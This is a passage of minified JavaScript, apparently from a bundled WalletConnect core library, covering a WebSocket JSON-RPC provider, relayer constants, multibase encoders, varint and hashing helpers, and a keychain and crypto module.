jf(t,e,n){return{id:t,jsonrpc:"2.0",error:jU(e)}}function jU(t,e){return typeof t>"u"?HE(pI):(typeof t=="string"&&(t=Object.assign(Object.assign({},HE(lw)),{message:t})),hU(t.code)&&(t=fU(t.code)),t)}class UU{}class MU extends UU{constructor(){super()}}class FU extends MU{constructor(e){super()}}const zU="^https?:",qU="^wss?:";function HU(t){const e=t.match(new RegExp(/^\w+:/,"gi"));if(!(!e||!e.length))return e[0]}function wI(t,e){const n=HU(t);return typeof n>"u"?!1:new RegExp(e).test(n)}function GE(t){return wI(t,zU)}function YE(t){return wI(t,qU)}function VU(t){return new RegExp("wss?://localhost(:d{2,5})?").test(t)}function vI(t){return typeof t=="object"&&"id"in t&&"jsonrpc"in t&&t.jsonrpc==="2.0"}function cw(t){return vI(t)&&"method"in t}function Uf(t){return vI(t)&&(Qr(t)||dr(t))}function Qr(t){return"result"in t}function dr(t){return"error"in t}let gr=class extends FU{constructor(e){super(e),this.events=new rr.EventEmitter,this.hasRegisteredEventListeners=!1,this.connection=this.setConnection(e),this.connection.connected&&this.registerEventListeners()}async connect(e=this.connection){await this.open(e)}async disconnect(){await this.close()}on(e,n){this.events.on(e,n)}once(e,n){this.events.once(e,n)}off(e,n){this.events.off(e,n)}removeListener(e,n){this.events.removeListener(e,n)}async request(e,n){return this.requestStrict(ys(e.method,e.params||[],e.id||Zs().toString()),n)}async requestStrict(e,n){return new Promise(async(r,i)=>{if(!this.connection.connected)try{await this.open()}catch(o){i(o)}this.events.on(`${e.id}`,o=>{dr(o)?i(o.error):r(o.result)});try{await this.connection.send(e,n)}catch(o){i(o)}})}setConnection(e=this.connection){return e}onPayload(e){this.events.emit("payload",e),Uf(e)?this.events.emit(`${e.id}`,e):this.events.emit("message",{type:e.method,data:e.params})}onClose(e){e&&e.code===3e3&&this.events.emit("error",new Error(`WebSocket connection closed abnormally with code: ${e.code} ${e.reason?`(${e.reason})`:""}`)),this.events.emit("disconnect")}async open(e=this.connection){this.connection===e&&this.connection.connected||(this.connection.connected&&this.close(),typeof e=="string"&&(await this.connection.open(e),e=this.connection),this.connection=this.setConnection(e),await this.connection.open(),this.registerEventListeners(),this.events.emit("connect"))}async close(){await this.connection.close()}registerEventListeners(){this.hasRegisteredEventListeners||(this.connection.on("payload",e=>this.onPayload(e)),this.connection.on("close",e=>this.onClose(e)),this.connection.on("error",e=>this.events.emit("error",e)),this.connection.on("register_error",e=>this.onClose()),this.hasRegisteredEventListeners=!0)}};const WU=t=>JSON.stringify(t,(e,n)=>typeof n=="bigint"?n.toString()+"n":n),KU=t=>{const e=/([\[:])?(\d{17,}|(?:[9](?:[1-9]07199254740991|0[1-9]7199254740991|00[8-9]199254740991|007[2-9]99254740991|007199[3-9]54740991|0071992[6-9]4740991|00719925[5-9]740991|007199254[8-9]40991|0071992547[5-9]0991|00719925474[1-9]991|00719925474099[2-9])))([,\}\]])/g,n=t.replace(e,'$1"$2n"$3');return JSON.parse(n,(r,i)=>typeof i=="string"&&i.match(/^\d+n$/)?BigInt(i.substring(0,i.length-1)):i)};function GU(t){if(typeof t!="string")throw new Error(`Cannot safe json parse value of type ${typeof t}`);try{return KU(t)}catch{return t}}function YU(t){return typeof t=="string"?t:WU(t)||""}const JU=()=>typeof WebSocket<"u"?WebSocket:typeof globalThis<"u"&&typeof globalThis.WebSocket<"u"?globalThis.WebSocket:typeof window<"u"&&typeof window.WebSocket<"u"?window.WebSocket:typeof self<"u"&&typeof self.WebSocket<"u"?self.WebSocket:require("ws"),ZU=()=>typeof WebSocket<"u"||typeof globalThis<"u"&&typeof globalThis.WebSocket<"u"||typeof window<"u"&&typeof window.WebSocket<"u"||typeof self<"u"&&typeof self.WebSocket<"u",JE=t=>t.split("?")[0],ZE=10,QU=JU();let XU=class{constructor(e){if(this.url=e,this.events=new rr.EventEmitter,this.registering=!1,!YE(e))throw new Error(`Provided URL is not compatible with WebSocket connection: ${e}`);this.url=e}get connected(){return typeof this.socket<"u"}get connecting(){return this.registering}on(e,n){this.events.on(e,n)}once(e,n){this.events.once(e,n)}off(e,n){this.events.off(e,n)}removeListener(e,n){this.events.removeListener(e,n)}async open(e=this.url){await this.register(e)}async close(){return new Promise((e,n)=>{if(typeof this.socket>"u"){n(new Error("Connection already closed"));return}this.socket.onclose=r=>{this.onClose(r),e()},this.socket.close()})}async send(e){typeof this.socket>"u"&&(this.socket=await this.register());try{this.socket.send(YU(e))}catch(n){this.onError(e.id,n)}}register(e=this.url){if(!YE(e))throw new Error(`Provided URL is not compatible with WebSocket connection: ${e}`);if(this.registering){const n=this.events.getMaxListeners();return(this.events.listenerCount("register_error")>=n||this.events.listenerCount("open")>=n)&&this.events.setMaxListeners(n+1),new Promise((r,i)=>{this.events.once("register_error",o=>{this.resetMaxListeners(),i(o)}),this.events.once("open",()=>{if(this.resetMaxListeners(),typeof this.socket>"u")return i(new Error("WebSocket connection is missing or invalid"));r(this.socket)})})}return this.url=e,this.registering=!0,new Promise((n,r)=>{const i=LU.isReactNative()?void 0:{rejectUnauthorized:!VU(e)},o=new QU(e,[],i);ZU()?o.onerror=l=>{const c=l;r(this.emitError(c.error))}:o.on("error",l=>{r(this.emitError(l))}),o.onopen=()=>{this.onOpen(o),n(o)}})}onOpen(e){e.onmessage=n=>this.onPayload(n),e.onclose=n=>this.onClose(n),this.socket=e,this.registering=!1,this.events.emit("open")}onClose(e){this.socket=void 0,this.registering=!1,this.events.emit("close",e)}onPayload(e){if(typeof e.data>"u")return;const n=typeof e.data=="string"?GU(e.data):e.data;this.events.emit("payload",n)}onError(e,n){const r=this.parseError(n),i=r.message||r.toString(),o=jf(e,i);this.events.emit("payload",o)}parseError(e,n=this.url){return yI(e,JE(n),"WS")}resetMaxListeners(){this.events.getMaxListeners()>ZE&&this.events.setMaxListeners(ZE)}emitError(e){const n=this.parseError(new Error((e==null?void 0:e.message)||`WebSocket connection failed for host: ${JE(this.url)}`));return this.events.emit("register_error",n),n}};var e6={};const bI="wc",EI=2,Jy="core",ti=`${bI}@2:${Jy}:`,t6={logger:"error"},n6={database:":memory:"},r6="crypto",QE="client_ed25519_seed",i6=be.ONE_DAY,s6="keychain",o6="0.3",a6="messages",l6="0.3",XE=be.SIX_HOURS,c6="publisher",xI="irn",u6="error",SI="wss://relay.walletconnect.org",h6="relayer",Wt={message:"relayer_message",message_ack:"relayer_message_ack",connect:"relayer_connect",disconnect:"relayer_disconnect",error:"relayer_error",connection_stalled:"relayer_connection_stalled",transport_closed:"relayer_transport_closed",publish:"relayer_publish"},f6="_subscription",ur={payload:"payload",connect:"connect",disconnect:"disconnect",error:"error"},d6=.1,Zy="2.20.3",dt={link_mode:"link_mode",relay:"relay"},Vh={inbound:"inbound",outbound:"outbound"},p6="0.3",g6="WALLETCONNECT_CLIENT_ID",e2="WALLETCONNECT_LINK_MODE_APPS",Gn={created:"subscription_created",deleted:"subscription_deleted",expired:"subscription_expired",disabled:"subscription_disabled",sync:"subscription_sync",resubscribed:"subscription_resubscribed"},y6="subscription",m6="0.3",w6="pairing",v6="0.3",ec={wc_pairingDelete:{req:{ttl:be.ONE_DAY,prompt:!1,tag:1e3},res:{ttl:be.ONE_DAY,prompt:!1,tag:1001}},wc_pairingPing:{req:{ttl:be.THIRTY_SECONDS,prompt:!1,tag:1002},res:{ttl:be.THIRTY_SECONDS,prompt:!1,tag:1003}},unregistered_method:{req:{ttl:be.ONE_DAY,prompt:!1,tag:0},res:{ttl:be.ONE_DAY,prompt:!1,tag:0}}},Ks={create:"pairing_create",expire:"pairing_expire",delete:"pairing_delete",ping:"pairing_ping"},Or={created:"history_created",updated:"history_updated",deleted:"history_deleted",sync:"history_sync"},b6="history",E6="0.3",x6="expirer",fr={created:"expirer_created",deleted:"expirer_deleted",expired:"expirer_expired",sync:"expirer_sync"},S6="0.3",_6="verify-api",I6="https://verify.walletconnect.com",_I="https://verify.walletconnect.org",gc=_I,O6=`${gc}/v3`,$6=[I6,_I],P6="echo",T6="https://echo.walletconnect.com",Jr={pairing_started:"pairing_started",pairing_uri_validation_success:"pairing_uri_validation_success",pairing_uri_not_expired:"pairing_uri_not_expired",store_new_pairing:"store_new_pairing",subscribing_pairing_topic:"subscribing_pairing_topic",subscribe_pairing_topic_success:"subscribe_pairing_topic_success",existing_pairing:"existing_pairing",pairing_not_expired:"pairing_not_expired",emit_inactive_pairing:"emit_inactive_pairing",emit_session_proposal:"emit_session_proposal",subscribing_to_pairing_topic:"subscribing_to_pairing_topic"},Ei={no_wss_connection:"no_wss_connection",no_internet_connection:"no_internet_connection",malformed_pairing_uri:"malformed_pairing_uri",active_pairing_already_exists:"active_pairing_already_exists",subscribe_pairing_topic_failure:"subscribe_pairing_topic_failure",pairing_expired:"pairing_expired",proposal_expired:"proposal_expired",proposal_listener_not_found:"proposal_listener_not_found"},$r={session_approve_started:"session_approve_started",proposal_not_expired:"proposal_not_expired",session_namespaces_validation_success:"session_namespaces_validation_success",create_session_topic:"create_session_topic",subscribing_session_topic:"subscribing_session_topic",subscribe_session_topic_success:"subscribe_session_topic_success",publishing_session_approve:"publishing_session_approve",session_approve_publish_success:"session_approve_publish_success",store_session:"store_session",publishing_session_settle:"publishing_session_settle",session_settle_publish_success:"session_settle_publish_success"},js={no_internet_connection:"no_internet_connection",no_wss_connection:"no_wss_connection",proposal_expired:"proposal_expired",subscribe_session_topic_failure:"subscribe_session_topic_failure",session_approve_publish_failure:"session_approve_publish_failure",session_settle_publish_failure:"session_settle_publish_failure",session_approve_namespace_validation_failure:"session_approve_namespace_validation_failure",proposal_not_found:"proposal_not_found"},Us={authenticated_session_approve_started:"authenticated_session_approve_started",create_authenticated_session_topic:"create_authenticated_session_topic",cacaos_verified:"cacaos_verified",store_authenticated_session:"store_authenticated_session",subscribing_authenticated_session_topic:"subscribing_authenticated_session_topic",subscribe_authenticated_session_topic_success:"subscribe_authenticated_session_topic_success",publishing_authenticated_session_approve:"publishing_authenticated_session_approve"},tc={no_internet_connection:"no_internet_connection",invalid_cacao:"invalid_cacao",subscribe_authenticated_session_topic_failure:"subscribe_authenticated_session_topic_failure",authenticated_session_approve_publish_failure:"authenticated_session_approve_publish_failure",authenticated_session_pending_request_not_found:"authenticated_session_pending_request_not_found"},A6=.1,C6="event-client",R6=86400,D6="https://pulse.walletconnect.org/batch";function N6(t,e){if(t.length>=255)throw new TypeError("Alphabet too long");for(var n=new Uint8Array(256),r=0;r<n.length;r++)n[r]=255;for(var i=0;i<t.length;i++){var o=t.charAt(i),l=o.charCodeAt(0);if(n[l]!==255)throw new TypeError(o+" is ambiguous");n[l]=i}var c=t.length,u=t.charAt(0),f=Math.log(c)/Math.log(256),d=Math.log(256)/Math.log(c);function y(w){if(w instanceof Uint8Array||(ArrayBuffer.isView(w)?w=new Uint8Array(w.buffer,w.byteOffset,w.byteLength):Array.isArray(w)&&(w=Uint8Array.from(w))),!(w instanceof Uint8Array))throw new TypeError("Expected Uint8Array");if(w.length===0)return"";for(var b=0,m=0,x=0,S=w.length;x!==S&&w[x]===0;)x++,b++;for(var O=(S-x)*d+1>>>0,$=new Uint8Array(O);x!==S;){for(var R=w[x],T=0,D=O-1;(R!==0||T<m)&&D!==-1;D--,T++)R+=256*$[D]>>>0,$[D]=R%c>>>0,R=R/c>>>0;if(R!==0)throw new Error("Non-zero carry");m=T,x++}for(var B=O-m;B!==O&&$[B]===0;)B++;for(var k=u.repeat(b);B<O;++B)k+=t.charAt($[B]);return k}function g(w){if(typeof w!="string")throw new TypeError("Expected String");if(w.length===0)return new Uint8Array;var b=0;if(w[b]!==" "){for(var m=0,x=0;w[b]===u;)m++,b++;for(var S=(w.length-b)*f+1>>>0,O=new Uint8Array(S);w[b];){var $=n[w.charCodeAt(b)];if($===255)return;for(var R=0,T=S-1;($!==0||R<x)&&T!==-1;T--,R++)$+=c*O[T]>>>0,O[T]=$%256>>>0,$=$/256>>>0;if($!==0)throw new Error("Non-zero carry");x=R,b++}if(w[b]!==" "){for(var D=S-x;D!==S&&O[D]===0;)D++;for(var B=new Uint8Array(m+(S-D)),k=m;D!==S;)B[k++]=O[D++];return B}}}function E(w){var b=g(w);if(b)return b;throw new Error(`Non-${e} character`)}return{encode:y,decodeUnsafe:g,decode:E}}var k6=N6,B6=k6;const II=t=>{if(t instanceof Uint8Array&&t.constructor.name==="Uint8Array")return t;if(t instanceof ArrayBuffer)return new Uint8Array(t);if(ArrayBuffer.isView(t))return new Uint8Array(t.buffer,t.byteOffset,t.byteLength);throw new Error("Unknown type, must be binary type")},L6=t=>new TextEncoder().encode(t),j6=t=>new TextDecoder().decode(t);class U6{constructor(e,n,r){this.name=e,this.prefix=n,this.baseEncode=r}encode(e){if(e instanceof Uint8Array)return`${this.prefix}${this.baseEncode(e)}`;throw Error("Unknown type, must be binary type")}}class M6{constructor(e,n,r){if(this.name=e,this.prefix=n,n.codePointAt(0)===void 0)throw new Error("Invalid prefix character");this.prefixCodePoint=n.codePointAt(0),this.baseDecode=r}decode(e){if(typeof e=="string"){if(e.codePointAt(0)!==this.prefixCodePoint)throw Error(`Unable to decode multibase string ${JSON.stringify(e)}, ${this.name} decoder only supports inputs prefixed with ${this.prefix}`);return this.baseDecode(e.slice(this.prefix.length))}else throw Error("Can only multibase decode strings")}or(e){return OI(this,e)}}class F6{constructor(e){this.decoders=e}or(e){return OI(this,e)}decode(e){const n=e[0],r=this.decoders[n];if(r)return r.decode(e);throw RangeError(`Unable to decode multibase string ${JSON.stringify(e)}, only inputs prefixed with ${Object.keys(this.decoders)} are supported`)}}const OI=(t,e)=>new F6({...t.decoders||{[t.prefix]:t},...e.decoders||{[e.prefix]:e}});class z6{constructor(e,n,r,i){this.name=e,this.prefix=n,this.baseEncode=r,this.baseDecode=i,this.encoder=new U6(e,n,r),this.decoder=new M6(e,n,i)}encode(e){return this.encoder.encode(e)}decode(e){return this.decoder.decode(e)}}const Mf=({name:t,prefix:e,encode:n,decode:r})=>new z6(t,e,n,r),Gc=({prefix:t,name:e,alphabet:n})=>{const{encode:r,decode:i}=B6(n,e);return Mf({prefix:t,name:e,encode:r,decode:o=>II(i(o))})},q6=(t,e,n,r)=>{const i={};for(let d=0;d<e.length;++d)i[e[d]]=d;let o=t.length;for(;t[o-1]==="=";)--o;const l=new Uint8Array(o*n/8|0);let c=0,u=0,f=0;for(let d=0;d<o;++d){const y=i[t[d]];if(y===void 0)throw new SyntaxError(`Non-${r} character`);u=u<<n|y,c+=n,c>=8&&(c-=8,l[f++]=255&u>>c)}if(c>=n||255&u<<8-c)throw new SyntaxError("Unexpected end of data");return l},H6=(t,e,n)=>{const r=e[e.length-1]==="=",i=(1<<n)-1;let o="",l=0,c=0;for(let u=0;u<t.length;++u)for(c=c<<8|t[u],l+=8;l>n;)l-=n,o+=e[i&c>>l];if(l&&(o+=e[i&c<<n-l]),r)for(;o.length*n&7;)o+="=";return o},un=({name:t,prefix:e,bitsPerChar:n,alphabet:r})=>Mf({prefix:e,name:t,encode(i){return H6(i,r,n)},decode(i){return q6(i,r,n,t)}}),V6=Mf({prefix:"\0",name:"identity",encode:t=>j6(t),decode:t=>L6(t)});var W6=Object.freeze({__proto__:null,identity:V6});const K6=un({prefix:"0",name:"base2",alphabet:"01",bitsPerChar:1});var G6=Object.freeze({__proto__:null,base2:K6});const Y6=un({prefix:"7",name:"base8",alphabet:"01234567",bitsPerChar:3});var J6=Object.freeze({__proto__:null,base8:Y6});const Z6=Gc({prefix:"9",name:"base10",alphabet:"0123456789"});var Q6=Object.freeze({__proto__:null,base10:Z6});const X6=un({prefix:"f",name:"base16",alphabet:"0123456789abcdef",bitsPerChar:4}),eM=un({prefix:"F",name:"base16upper",alphabet:"0123456789ABCDEF",bitsPerChar:4});var tM=Object.freeze({__proto__:null,base16:X6,base16upper:eM});const nM=un({prefix:"b",name:"base32",alphabet:"abcdefghijklmnopqrstuvwxyz234567",bitsPerChar:5}),rM=un({prefix:"B",name:"base32upper",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567",bitsPerChar:5}),iM=un({prefix:"c",name:"base32pad",alphabet:"abcdefghijklmnopqrstuvwxyz234567=",bitsPerChar:5}),sM=un({prefix:"C",name:"base32padupper",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567=",bitsPerChar:5}),oM=un({prefix:"v",name:"base32hex",alphabet:"0123456789abcdefghijklmnopqrstuv",bitsPerChar:5}),aM=un({prefix:"V",name:"base32hexupper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUV",bitsPerChar:5}),lM=un({prefix:"t",name:"base32hexpad",alphabet:"0123456789abcdefghijklmnopqrstuv=",bitsPerChar:5}),cM=un({prefix:"T",name:"base32hexpadupper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUV=",bitsPerChar:5}),uM=un({prefix:"h",name:"base32z",alphabet:"ybndrfg8ejkmcpqxot1uwisza345h769",bitsPerChar:5});var hM=Object.freeze({__proto__:null,base32:nM,base32upper:rM,base32pad:iM,base32padupper:sM,base32hex:oM,base32hexupper:aM,base32hexpad:lM,base32hexpadupper:cM,base32z:uM});const fM=Gc({prefix:"k",name:"base36",alphabet:"0123456789abcdefghijklmnopqrstuvwxyz"}),dM=Gc({prefix:"K",name:"base36upper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"});var pM=Object.freeze({__proto__:null,base36:fM,base36upper:dM});const gM=Gc({name:"base58btc",prefix:"z",alphabet:"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"}),yM=Gc({name:"base58flickr",prefix:"Z",alphabet:"123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ"});var mM=Object.freeze({__proto__:null,base58btc:gM,base58flickr:yM});const wM=un({prefix:"m",name:"base64",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",bitsPerChar:6}),vM=un({prefix:"M",name:"base64pad",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",bitsPerChar:6}),bM=un({prefix:"u",name:"base64url",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_",bitsPerChar:6}),EM=un({prefix:"U",name:"base64urlpad",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_=",bitsPerChar:6});var xM=Object.freeze({__proto__:null,base64:wM,base64pad:vM,base64url:bM,base64urlpad:EM});const $I=Array.from("🚀🪐☄🛰🌌🌑🌒🌓🌔🌕🌖🌗🌘🌍🌏🌎🐉☀💻🖥💾💿😂❤😍🤣😊🙏💕😭😘👍😅👏😁🔥🥰💔💖💙😢🤔😆🙄💪😉☺👌🤗💜😔😎😇🌹🤦🎉💞✌✨🤷😱😌🌸🙌😋💗💚😏💛🙂💓🤩😄😀🖤😃💯🙈👇🎶😒🤭❣😜💋👀😪😑💥🙋😞😩😡🤪👊🥳😥🤤👉💃😳✋😚😝😴🌟😬🙃🍀🌷😻😓⭐✅🥺🌈😈🤘💦✔😣🏃💐☹🎊💘😠☝😕🌺🎂🌻😐🖕💝🙊😹🗣💫💀👑🎵🤞😛🔴😤🌼😫⚽🤙☕🏆🤫👈😮🙆🍻🍃🐶💁😲🌿🧡🎁⚡🌞🎈❌✊👋😰🤨😶🤝🚶💰🍓💢🤟🙁🚨💨🤬✈🎀🍺🤓😙💟🌱😖👶🥴▶➡❓💎💸⬇😨🌚🦋😷🕺⚠🙅😟😵👎🤲🤠🤧📌🔵💅🧐🐾🍒😗🤑🌊🤯🐷☎💧😯💆👆🎤🙇🍑❄🌴💣🐸💌📍🥀🤢👅💡💩👐📸👻🤐🤮🎼🥵🚩🍎🍊👼💍📣🥂"),SM=$I.reduce((t,e,n)=>(t[n]=e,t),[]),_M=$I.reduce((t,e,n)=>(t[e.codePointAt(0)]=n,t),[]);function IM(t){return t.reduce((e,n)=>(e+=SM[n],e),"")}function OM(t){const e=[];for(const n of t){const r=_M[n.codePointAt(0)];if(r===void 0)throw new Error(`Non-base256emoji character: ${n}`);e.push(r)}return new Uint8Array(e)}const $M=Mf({prefix:"🚀",name:"base256emoji",encode:IM,decode:OM});var PM=Object.freeze({__proto__:null,base256emoji:$M}),TM=PI,t2=128,AM=-128,CM=Math.pow(2,31);function PI(t,e,n){e=e||[],n=n||0;for(var r=n;t>=CM;)e[n++]=t&255|t2,t/=128;for(;t&AM;)e[n++]=t&255|t2,t>>>=7;return e[n]=t|0,PI.bytes=n-r+1,e}var RM=Qy,DM=128,n2=127;function Qy(t,r){var n=0,r=r||0,i=0,o=r,l,c=t.length;do{if(o>=c)throw Qy.bytes=0,new RangeError("Could not decode varint");l=t[o++],n+=i<28?(l&n2)<<i:(l&n2)*Math.pow(2,i),i+=7}while(l>=DM);return Qy.bytes=o-r,n}var NM=Math.pow(2,7),kM=Math.pow(2,14),BM=Math.pow(2,21),LM=Math.pow(2,28),jM=Math.pow(2,35),UM=Math.pow(2,42),MM=Math.pow(2,49),FM=Math.pow(2,56),zM=Math.pow(2,63),qM=function(t){return t<NM?1:t<kM?2:t<BM?3:t<LM?4:t<jM?5:t<UM?6:t<MM?7:t<FM?8:t<zM?9:10},HM={encode:TM,decode:RM,encodingLength:qM},TI=HM;const r2=(t,e,n=0)=>(TI.encode(t,e,n),e),i2=t=>TI.encodingLength(t),Xy=(t,e)=>{const n=e.byteLength,r=i2(t),i=r+i2(n),o=new Uint8Array(i+n);return r2(t,o,0),r2(n,o,r),o.set(e,i),new VM(t,n,e,o)};class VM{constructor(e,n,r,i){this.code=e,this.size=n,this.digest=r,this.bytes=i}}const AI=({name:t,code:e,encode:n})=>new WM(t,e,n);class WM{constructor(e,n,r){this.name=e,this.code=n,this.encode=r}digest(e){if(e instanceof Uint8Array){const n=this.encode(e);return n instanceof Uint8Array?Xy(this.code,n):n.then(r=>Xy(this.code,r))}else throw Error("Unknown type, must be binary type")}}const CI=t=>async e=>new Uint8Array(await crypto.subtle.digest(t,e)),KM=AI({name:"sha2-256",code:18,encode:CI("SHA-256")}),GM=AI({name:"sha2-512",code:19,encode:CI("SHA-512")});var YM=Object.freeze({__proto__:null,sha256:KM,sha512:GM});const RI=0,JM="identity",DI=II,ZM=t=>Xy(RI,DI(t)),QM={code:RI,name:JM,encode:DI,digest:ZM};var XM=Object.freeze({__proto__:null,identity:QM});new TextEncoder,new TextDecoder;const s2={...W6,...G6,...J6,...Q6,...tM,...hM,...pM,...mM,...xM,...PM};({...YM,...XM});function e9(t=0){return globalThis.Buffer!=null&&globalThis.Buffer.allocUnsafe!=null?globalThis.Buffer.allocUnsafe(t):new Uint8Array(t)}function NI(t,e,n,r){return{name:t,prefix:e,encoder:{name:t,prefix:e,encode:n},decoder:{decode:r}}}const o2=NI("utf8","u",t=>"u"+new TextDecoder("utf8").decode(t),t=>new TextEncoder().encode(t.substring(1))),Mg=NI("ascii","a",t=>{let e="a";for(let n=0;n<t.length;n++)e+=String.fromCharCode(t[n]);return e},t=>{t=t.substring(1);const e=e9(t.length);for(let n=0;n<t.length;n++)e[n]=t.charCodeAt(n);return e}),t9={utf8:o2,"utf-8":o2,hex:s2.base16,latin1:Mg,ascii:Mg,binary:Mg,...s2};function n9(t,e="utf8"){const n=t9[e];if(!n)throw new Error(`Unsupported encoding "${e}"`);return(e==="utf8"||e==="utf-8")&&globalThis.Buffer!=null&&globalThis.Buffer.from!=null?globalThis.Buffer.from(t,"utf8"):n.decoder.decode(`${n.prefix}${t}`)}var r9=Object.defineProperty,i9=(t,e,n)=>e in t?r9(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,Wr=(t,e,n)=>i9(t,typeof e!="symbol"?e+"":e,n);let s9=class{constructor(e,n){this.core=e,this.logger=n,Wr(this,"keychain",new Map),Wr(this,"name",s6),Wr(this,"version",o6),Wr(this,"initialized",!1),Wr(this,"storagePrefix",ti),Wr(this,"init",async()=>{if(!this.initialized){const r=await this.getKeyChain();typeof r<"u"&&(this.keychain=r),this.initialized=!0}}),Wr(this,"has",r=>(this.isInitialized(),this.keychain.has(r))),Wr(this,"set",async(r,i)=>{this.isInitialized(),this.keychain.set(r,i),await this.persist()}),Wr(this,"get",r=>{this.isInitialized();const i=this.keychain.get(r);if(typeof i>"u"){const{message:o}=Ee("NO_MATCHING_KEY",`${this.name}: ${r}`);throw new Error(o)}return i}),Wr(this,"del",async r=>{this.isInitialized(),this.keychain.delete(r),await this.persist()}),this.core=e,this.logger=Sn(n,this.name)}get context(){return Fn(this.logger)}get storageKey(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//"+this.name}async setKeyChain(e){await this.core.storage.setItem(this.storageKey,ky(e))}async getKeyChain(){const e=await this.core.storage.getItem(this.storageKey);return typeof e<"u"?By(e):void 0}async persist(){await this.setKeyChain(this.keychain)}isInitialized(){if(!this.initialized){const{message:e}=Ee("NOT_INITIALIZED",this.name);throw new Error(e)}}};var o9=Object.defineProperty,a9=(t,e,n)=>e in t?o9(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,rn=(t,e,n)=>a9(t,typeof e!="symbol"?e+"":e,n);class l9{constructor(e,n,r){this.core=e,this.logger=n,rn(this,"name",r6),rn(this,"keychain"),rn(this,"randomSessionIdentifier",Wy()),rn(this,"initialized",!1),rn(this,"init",async()=>{this.initialized||(await this.keychain.init(),this.initialized=!0)}),rn(this,"hasKeys",i=>(this.isInitialized(),this.keychain.has(i))),rn(this,"getClientId",async()=>{this.isInitialized();const i=await this.getClientSeed(),o=ab(i);return LS(o.publicKey)}),rn(this,"generateKeyPair",()=>{this.isInitialized();const i=hj();return this.setPrivateKey(i.publicKey,i.privateKey)}),rn(this,"signJWT",async i=>{this.isInitialized();const o=await this.getClientSeed(),l=ab(o),c=this.randomSessionIdentifier;return await $8(c,i,i6,l)}),rn(this,"generateSharedKey",(i,o,l)=>{this.isInitialized();const c=this.getPrivateKey(i),u=fj(c,o);return this.setSymKey(u,l)}),rn(this,"setSymKey",async(i,o)=>{this.isInitialized();const l=o||Hh(i);return await this.keychain.set(l,i),l}),rn(this,"deleteKeyPair",async i=>{this.isInitialized(),await this.keychain.del(i)}),rn(this,"deleteSymKey",async i=>{this.isInitialized(),await this.keychain.del(i)}),rn(this,"encode",async(i,o,l)=>{this.isInitialized();const c=hI(l),u=Zm(o);if(kE(c))return gj(u,l==null?void 0:l.encoding);if(NE(c)){const g=c.senderPublicKey,E=c.receiverPublicKey;i=await this.generateSharedKey(g,E)}const f=this.getSymKey(i),{type:d,senderPublicKey:y}=c;return dj({type:d,symKey:f,message:u,senderPublicKey:y,encoding:l==null?void 0:l.encoding})}),rn(this,"decode",async(i,o,l)=>{this.isInitialized();const c=mj(o,l);if(kE(c)){const u=yj(o,l==null?void 0:l.encoding);return tf(u)}if(NE(c)){const u=c.receiverPublicKey,f=c.senderPublicKey;i=await this.generateSharedKey(u,f)}try{const u=this.getSymKey(i),f=pj({symKey:u,encoded:o,encoding:l==null?void 0:l.encoding});return tf(f)}catch(u){this.logger.error(`Failed to decode message from topic: '${i}', clientId: '${await this.getClientId()}'`),this.logger.error(u)}}),rn(this,"getPayloadType",(i,o=kr)=>{const l=Oc({encoded:i,encoding:o});return ao(l.type)}),rn(this,"getPayloadSenderPublicKey",(i,o=kr)=>{const l=Oc({encoded:i,encoding:o});return l.senderPublicKey?jn(l.senderPublicKey,xn):void 0}),this.core=e,this.logger=Sn(n,this.name),this.keychain=r||new s9(this.core,this.logger)}get context(){return Fn(this.logger)}async setPrivateKey(e,n){return await this.keychain.set(e,n),e}getPrivateKey(e){return this.keychain.get(e)}async getClientSeed(){let e="";try{e=this.keychain.get(QE)}catch{e=Wy(),await this.keychain.set(QE,e)}return n9(e,"base16")}getSymKey(e){return this.keychain.get(e)}isInitialized(){if(!this.initialized){const{message:e}=Ee("NOT_INITIALIZED",this.name);throw new Error(e)}}}var c9=Object.defineProperty,u9=Object.defineProperties,h9=Object.getOwnPropertyDescriptors,a2=Object.getOwnPropertySymbols,f9=Object.prototype.hasOwnProperty,d9=Object.prototype.propertyIsEnumerable,em=(t,e,n)=>e in t?c9(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,p9=(t,e)=>{for(var n in e||(e={}))f9.call(e,n)&&em(t,n,e[n]);if(a2)for(var n of a2(e))d9.call(e,n)&&em(t,n,e[n]);return t},g9=(t,e)=>u9(t,h9(e)),Wn=(t,e,n)=>em(t,typeof e!="symbol"?e+"":e,n);let y9=class extends b4{constructor(e,n){super(e,n),this.logger=e,this.core=n,Wn(this,"messages",new Map),Wn(this,"messagesWithoutClientAck",new Map),Wn(this,"name",a6),Wn(this,"version",l6),Wn(this,"initialized",!1),Wn(this,"storagePrefix",ti),Wn(this,"init",async()=>{if(!this.initialized){this.logger.trace("Initialized");try{const r=await this.getRelayerMessages();typeof r<"u"&&(this.messages=r);const i=await this.getRelayerMessagesWithoutClientAck();typeof i<"u"&&(this.messagesWithoutClientAck=i),this.logger.debug(`Successfully Restored records for ${this.name}`),this.logger.trace({type:"method",method:"restore",size:this.messages.size})}catch(r){this.logger.debug(`Failed to Restore records for ${this.name}`),this.logger.error(r)}finally{this.initialized=!0}}}),Wn(this,"set",async(r,i,o)=>{this.isInitialized();const l=Xr(i);let c=this.messages.get(r);if(typeof c>"u"&&(c={}),typeof c[l]<"u")return l;if(c[l]=i,this.messages.set(r,c),o===Vh.inbound){const u=this.messagesWithoutClientAck.get(r)||{};this.messagesWithoutClientAck.set(r,g9(p9({},u),{[l]:i}))}return await this.persist(),l}),Wn(this,"get",r=>{this.isInitialized();let 